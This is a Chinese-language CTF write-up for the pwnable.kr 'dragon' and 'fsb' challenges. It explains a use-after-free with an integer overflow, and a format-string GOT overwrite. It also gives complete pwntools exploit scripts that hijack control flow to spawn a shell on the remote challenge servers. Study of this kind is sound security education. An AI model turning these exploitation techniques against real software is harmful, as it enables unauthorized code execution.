# Pwnable-Kr-Rookiss

### dragon

>I made a RPG game for my little brother.
>But to trick him, I made it impossible to win.
>I hope he doesn't get too angry with me :P!
>
>Author : rookiss
>Download : http://pwnable.kr/bin/dragon
>
>Running at : nc pwnable.kr 9004
>
>On Aug 1,2018

UAF的一道「简单题」，但我不会。。。pwn做的太少了

#### 简要分析

简单说一下为什么会有UAF漏洞，程序在`FightDragon`函数里声明了两个结构体`ptr`和`v5`，大小均为`0x10`，分别代表dragon和player。由于在`attack`函数中player的指针不论是失败或是胜利都会被free，但是这个指针并没有指向NULL，导致下一次malloc相同大小的空间时会分配到同一地址，当我们把修改这次的内容时实际上覆盖了player的内容，所以可以在这里「搞事情」。

用IDA看伪代码的时候觉得这肯定不用打赢龙的，于是一直在找「外围」的函数的利用点，但没找到什么有用的。之后看了别人的wp后发现是可以打赢龙的，并且非赢不可。

之所以能够打赢龙是因为「龙的血量」的数据大小是1个字节，即最大127，当更大时造成溢出变成负值，这时符合胜利条件。

之所以非赢不可是因为胜利之后会进入如下代码块

```c
  if ( v3 )
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    v2 = malloc(0x10u);
    __isoc99_scanf("%16s", v2);
    puts("And The Dragon You Have Defeated Was Called:");
    ((void (__cdecl *)(_DWORD *))*v5)(v5);
  }
```

这里的`v2`分配的大小是`0x10`，和上面的结构体大小相同，于是`v2`的地址和`player`的地址相同，这时我们可以把`system('/bin/sh')`的地址输入，在最后一行调用的时候就相当于`getshell`了:-)

#### exp

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
import sys
context.log_level = 'debug'

if sys.argv[1] == 'loc':
	io = process('./dragon')
else:
	io = remote('pwnable.kr',9004)

sys_addr = 0x08048DBF

def playGame():
	
	for i in range(4):
		io.sendline('1')
	for i in range(4):
		io.sendline('3\n3\n2\n')
	io.sendline(p32(sys_addr))

if __name__ == "__main__":
	
	playGame()
	io.interactive()
```



### fsb

#### 题面

> Isn't FSB almost obsolete in computer security?
> Anyway, have fun with it :)
>
> ssh fsb@pwnable.kr -p2222 (pw:guest)
>
> On Aug 15,2018

#### 大致分析

明显的格式化字符串漏洞类型的题目，由于buf不在栈上，我们需要借助栈上的其他数据如ebp来作为跳板。

类似的题目还有[HITCON-Training-lab9](https://l1b0.github.io/2018/08/08/Format-String-Bug-Training/)

题目流程大致是经过四次`read`和`printf`的fsb利用后，check输入的pw和程序随机出来的key是否相等。

我一开始想的是把key的bss段地址放到栈上，然后通过任意地址读得到key，但后来发现程序生成的key太大了，而pw的输入限制长度为10，所以不可能通过正常流程拿到权限。

那后来就覆盖sleep的got表的真实地址为`execve('/bin/sh')`，过程正好用了四次fsb。

> 1. 泄露栈的esp，方便后面定位栈上其他的地址
> 2. 泄露main的ebp，由于main的ebp和栈上的偏移不固定，所以需要单独泄露一次
> 3. 将main的ebp覆盖为sleep的got表地址
> 4. 将sleep的got表地址覆盖为`execve('/bin/sh')`

#### exp如下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
from sys import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c' ]

if argv[1] == 'l':
	io = process('./fsb')
else:
	io = ssh(host='pwnable.kr',port=2222,user='fsb',password='guest').run('/home/fsb/fsb')

def DEBUG():

	gdb.attach(io,"b *0x08048608\nc")

def leak_esp():

	payload = "+%14$x+"
	io.sendline(payload)
	io.recvuntil('+')
	esp = int(io.recvuntil('+')[:-1],16)-0x50

	return esp

def leak_ebp_main():

	payload = "+%18$x+"
	io.sendline(payload)
	io.recvuntil('+')
	ebp_main = int(io.recvuntil('+')[:-1],16)

	return ebp_main

def ebp_main_to_got():

	got_addr = 0x0804A008 

	payload = "%{}c%18$n".format(got_addr)
	io.sendline(payload)

def sleep_to_flag(offset):

	flag_addr = 0x080486AB
	payload = "%{}c%{}$hn".format(flag_addr&0xffff,offset)
	io.sendline(payload)

if __name__ == '__main__':

	esp = leak_esp()
	print hex(esp)
	pause()

	ebp_main = leak_ebp_main()
	print hex(ebp_main)
	pause()

	ebp_main_to_got()
	pause()

	offset = (ebp_main-esp)/4
	sleep_to_flag(offset)
	pause()

	io.interactive()
```

#### References:

- https://blog.csdn.net/SmalOSnail/article/details/53705774